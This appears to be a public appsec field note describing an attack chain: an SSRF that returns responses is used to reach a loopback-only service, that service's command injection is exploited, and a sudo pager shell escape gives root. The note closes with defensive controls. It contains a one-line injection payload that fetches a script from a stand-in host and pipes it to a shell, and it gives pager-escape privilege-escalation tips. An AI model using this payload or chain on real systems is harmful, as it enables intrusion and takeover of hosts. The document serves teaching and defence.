---
title: "Field note: response-returning SSRF as a tunnel to an internal service's RCE"
category: "fieldnote"
tags:
  - appsec
  - ssrf
  - command-injection
  - internal-services
  - sudo
  - gtfobins
  - privilege-escalation
visibility: "public"
date: "2026-06-19"
---

# Response-returning SSRF as a tunnel to an internal service's RCE

> **VISIBILITY: PUBLIC.** Sanitized; safe to post anywhere.

A portable lesson distilled from a CTF-style Linux chain. No target, tooling-agnostic.

## The shape

An internet-facing web app exposes a feature that issues HTTP requests on the server's behalf and **returns the response to the caller** (a webhook forwarder, "fetch this URL", PDF/screenshot-by-URL, avatar-by-URL, an outbound proxy/forward setting). A second service runs on the same host bound to **loopback** and firewalled from outside - so it is "internal only." It is not: the front-end app can be pointed at `http://127.0.0.1:<port>/` and will fetch the internal service and hand back its response. That internal service then has its own vulnerability (here, unauthenticated command injection), and because the SSRF returns responses, a full second exploit can be carried through it - not just a reachability check.

```text
internet-facing app with a "fetch a URL" feature (response returned)
    |
point forward_url / fetch target at http://127.0.0.1:<internal port>/
    |
read the internal-only service through the proxy   (loopback firewall bypassed)
    |
exploit the internal service's own bug THROUGH the same proxy
    |
code execution as the internal service's account
    |
local privilege escalation -> root
```

## The recognition calls

1. **A `filtered`/internal-only port next to an externally reachable web app is an SSRF target before you even have a CVE.** Find the app's request-issuing feature and aim it at loopback. The app's own fetch feature is your internal port scanner - whichever internal port returns a recognizable page is the real target.

2. **"Internal only" is not a security boundary when an on-host app will make requests for you.** A loopback bind plus a host firewall stops a direct connection; it does nothing once a front-end app proxies to it. Internal services still need their own authentication.

3. **A response-returning SSRF is a tunnel, not just a reachability probe.** If the proxy forwards method, path, and body and returns the response, you can drive a complete exploit (including a POST with an injection payload) against the internal service through it.

4. **When injecting through a constrained channel, keep the injected command trivial and host the complexity.** A backtick `;`fetch http://you/x.sh | sh`;` beats URL-encoding a full reverse shell with redirections and `/dev/tcp` inside a single parameter.

## A privesc recognition that pairs with it

- **Any passwordless sudo grant on a command that can page or shell out is a root shell.** Service-status, log-viewing, and file-viewing commands that invoke a pager (the pager allows `!command` shell escapes) run that escape as root when the parent command is sudo'd. The dangerous surface is what the allowed command *spawns*, not the command itself. The pager only launches if output exceeds the terminal height - shrink the terminal to force it.
- A pager at end-of-file may display an end marker instead of its usual prompt; the shell-escape still works from there. Do not read the end marker as "the pager failed."

## Controls that break it

- Patch or retire end-of-life web tooling; both the SSRF-capable front end and the injectable internal service were known-vulnerable versions.
- Authenticate internal services - loopback binding is reachability control, not authorization.
- Constrain any URL-fetching feature with an allowlist; deny loopback/link-local/private ranges by default.
- Scope sudo rules to the exact need; avoid commands that invoke pagers or shell out, or disable the pager explicitly. Run web apps as isolated low-privilege accounts segmented from sudo-capable users.
